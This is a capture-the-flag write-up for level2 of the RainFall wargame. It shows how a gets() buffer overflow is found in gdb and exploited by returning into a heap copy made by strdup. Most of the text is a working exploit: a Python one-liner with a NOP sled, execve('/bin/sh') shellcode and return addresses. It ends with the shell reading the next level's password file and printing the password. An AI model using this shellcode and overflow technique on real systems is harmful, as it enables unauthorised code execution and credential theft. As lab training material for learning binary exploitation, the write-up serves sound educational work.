1. Let's run `level2` exec to first see the behavior. It waits for an input, and then prints it to stdout :
    ```
    level2@RainFall:~$ ./level2
    coucou
    coucou
    ```

2. `gdb ./level2` then `set disassembly-flavor intel` and then `disas main`

3. We see that the `main` function calls the `p` function.

4. `disas p` => we see that the `gets` function is called. we know that this function does not check for buffer overflow so
    we could use a bof here.
    We see that the buffer given as argument starts at address `$ebp-0x4c` (cf line <+19> where this addres is loaded into $eax and then stored on the stack as argument to gets function call). This represents **76 bytes**.
    Then at $ebp is stored the value of the stackbase pointer for the main function (which will be retrieved when getting out of p()) => you can check this by breaking before the p function call in main and check value inside $ebp `i r $ebp`, and then breaking inside the p() function and check the content at $ebp address (`i r $ebp` to get address stored in $ebp, and then `x/8wx addr`).
    So we have **76 + 4 = 80 bytes** before erasing the main() next instruction stored location ($eip at time of p() call).
    With our shellcode representing 45 bytes, we have to fill up the buffer with 35 NOP bytes (`\x90`), then our sheell code, and then an address inside the NOP sequence (does not matter, the program will jump to next instruction if current instruciton is NOP).
    Let's find the address at the beginning of our buffer : `x/20wx $ebp-0x4c`, which gives **0xbffff69c**. We can take whichever address in the range formed by this address and this address + 35 bytes. Let's take +0x10 or +16 bytes : **0xbffff6ac**

5. Let's launch our bof:

    ```
    python -c 'print("\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\xac\xf6\xff\xbf")' > /tmp/exploit

    cat /tmp/exploit - > ./level2
    ```

    *Note : the memory works according to the little endian convention : the highest byte is on the right, the lowest on the left in one address. That is why we have to reverse it* 

6. Result : The address we wanted to call for our bof (the one stored where the nedxt instruction of the main is stored) is
    printed in stdout, and the program quits.
    ```
    level2@RainFall:~$ cat /tmp/exploit - | ./level2
    (0xbffff6ac)
    level2@RainFall:~$
    ```

    Indeed - see `source.c` file, after teh call to the gets function, the program checks that the value stored at `$ebp + 0x4`, meaning the value stored at the address where the $eip of the main() function is supposed to be stored, is not a stack based address (it checks that it does not start with `b`). If it does, the program prints out the address and exit, not returning to the main, hence not executing the next instruciton in main => our bof does not work.


7. We can see that if the address stored there is not a stack based address, the program call `strdup` with the address of our 
    buffer as argument. `strdup` will malloc a new address memory (hence in the heap), of the size of our buffer, fill up this new memory location with the content of our buffer, and returns the address of this newly allocated memory. We can recover this new memory location with the content of our buffer : it is stored in `$eaax` register when the function returns.
    To do this, we juste set a breakpoint right after the `strdup` function call (at **0x0804853d**) and check the value stored in $eax (`i r $eax`). We find that this newly allocated buffer is stored at address **0x804a008**.
    So we have to store this address as the next instruction of the main() function ($eip of the main function) instead of the one of our buffer on the stack. Let's try our exploit with this address:

    ```
    python -c 'print("\x90"*35 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x08\xa0\x04\x08")' > /tmp/exploit

    level2@RainFall:~$ cat /tmp/exploit - | ./level2
    ������������������������������������^�1��F�F
                                            �
                                             ���V
                                                  ̀1�����/bin/s�
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
    ```
